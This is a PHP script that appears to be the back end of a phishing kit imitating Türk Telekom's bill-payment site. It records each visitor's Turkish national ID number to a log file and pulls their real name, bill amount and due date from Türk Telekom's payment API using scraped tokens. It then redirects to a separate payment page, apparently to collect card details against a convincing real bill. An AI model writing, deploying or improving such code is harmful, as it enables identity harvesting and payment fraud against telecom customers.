<?php
session_start();

if($_SESSION['status'] == "ok")
{
	echo '<script>window.location.href = "index.php?hata=nobill";</script>';
	die();
}
if(strlen($_POST['g-recaptcha-response']) <= 10)
{
	echo '<script>window.location.href = "index.php?hata=captcha";</script>';
	die();
}

$tckimlik = htmlspecialchars($_POST['login']);


if(strlen($tckimlik) <= 10)
{
	echo '<script>window.location.href = "index.php?hata=nobill";</script>';
	die();
}

function getBetween($content, $start, $end) 
{
    $n = explode($start, $content);
    $result = Array();
    foreach ($n as $val) {
        $pos = strpos($val, $end);
        if ($pos !== false) {
            $result[] = substr($val, 0, $pos);
        }
    }
    return $result;
}

file_put_contents('./log_'.date("j.n.Y").'.log', $tckimlik . PHP_EOL, FILE_APPEND);

$ch = curl_init();

curl_setopt($ch,CURLOPT_URL,"https://onlineislemler.turktelekom.com.tr/oim/generateVposReverseProxyAddress/getVposFaturaSorgulamaOdemeHash?timestamp=2021-08-21T18:01:06.624Z&isTV=false");
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
$headers   = array();
$headers[] = 'Connection: Keep-Alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

$responseObject = getBetween($result, "responseObject\":\"", "\"");

curl_setopt($ch, CURLOPT_URL,"https://paymentapi.turktelekom.com.tr/api/Token/QueryToken");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
curl_setopt($ch, CURLOPT_POSTFIELDS,"{\"Token\":\"".$responseObject[1]."\",\"ApplicationId\":4,\"CompanyId\":510}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
$cryptotoken = getBetween($result, "CryptoTokenPassData\":\"", "\"");
$trackid = getBetween($result, "TrackId\":\"", "\"");

curl_setopt($ch, CURLOPT_URL,"https://paymentapi.turktelekom.com.tr/api/TTPayment/TTBillInquiry");
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
curl_setopt($ch, CURLOPT_POSTFIELDS,"{\"CryptoTokenPassData\":\"".$cryptotoken[1]."\",\"TrackId\":\"".$trackid[1]."\",\"AreMyBills\":true,\"CustomerInfoArray\":[{\"CustomerAccessNumber\":\"".$tckimlik."\",\"CustomerAccessType\":6}],\"QueryType\":1,\"CaptchaResponse\":\"".$_POST['g-recaptcha-response']."\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, 1);
$fatura = curl_exec($ch);
curl_close ($ch);
if(strpos($fatura, "NameSurname") !== false)
{
	$isim = getBetween($fatura ,"NameSurname\":\"" ,"\"");
	$miktar = getBetween($fatura ,"Amount\":" ,",");
	$skt = getBetween($fatura ,"DueDate\":\"" ,"\"");
	$_SESSION['isim'] = $isim[1];
	$_SESSION['miktar'] = $miktar[1];
	$_SESSION['skt'] = $skt[1];
	$_SESSION['tck'] = $tckimlik;
    echo '<script>window.location.href = "odeme.php";</script>';
	die();
} else
{
    echo '<script>window.location.href = "index.php?hata=nobill";</script>';
	die();
}

?>
